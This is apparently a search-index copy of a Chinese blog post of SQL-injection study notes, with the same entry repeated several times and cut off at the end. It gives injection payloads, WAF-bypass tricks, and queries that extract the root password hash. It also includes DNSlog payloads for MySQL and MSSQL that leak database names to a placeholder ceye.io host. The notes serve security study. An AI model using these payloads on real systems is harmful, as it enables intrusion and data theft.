8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3获取信息的方式不同分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3盲注原理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4一个登录框怎么测试"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5报错注入的函数有哪些"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#6sql-注入无回显的情况下利用-dnslogmysql-下利用什么构造代码mssql-下又如何构造"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 